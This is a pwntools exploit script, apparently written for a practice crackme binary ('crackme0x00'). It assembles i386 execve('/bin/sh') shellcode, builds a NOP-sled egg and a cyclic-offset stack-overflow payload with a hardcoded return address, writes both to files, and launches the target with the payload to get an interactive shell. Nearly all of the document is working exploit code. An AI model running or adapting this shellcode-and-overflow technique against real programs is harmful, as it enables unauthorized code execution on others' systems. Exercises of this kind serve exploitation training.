#rsp+6 : envp
#envp : env
#!/usr/bin/env python

from pwn import *
import os
#context.update(arch='amd64', os='linux')
context.update(arch='i386', os='linux')

shellcode = """
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    /* push SYS_execve 0xb */
    push 0x3b
    pop eax
    xor eax,0x30
    int 0x80
    """
shellcode = shellcraft.sh()
with open ("shellcraft.bin","wb") as f:
    f.write(b'\x90'*10+asm(shellcode))
    
print(shellcode)
print(hexdump(asm(shellcode)))
egg = b'\x90'*500+asm(shellcode)
#os.environ["GGG"] = egg.decode()
#egg = str('\x90'*200+asm(shellcode))
print(egg)
payload  = cyclic(cyclic_find(0x61616167))
#payload  = cyclic(100)
#payload += p64(0x7fffffffec63)
payload += p32(0xffffde66) #+7!!!
#payload += asm(shellcode)

with open ("payload.bin","wb") as f:
    f.write(payload)
p = process(["/home/vagrant/getenvaddr32","GEG","./crackme0x00"])
p.interactive()
p = process("./crackme0x00")
#p = gdb.debug([os.getcwd() + "/crackme0x00"],'''
#    unset env LINES
#    unset env COLUMNS
#    break main
#    continue
#    ''')
#gdb.attach(p, '''
#echo "hi"
# break *0xdeadbeef
#continue
#''')
p.sendline(payload)
p.interactive()
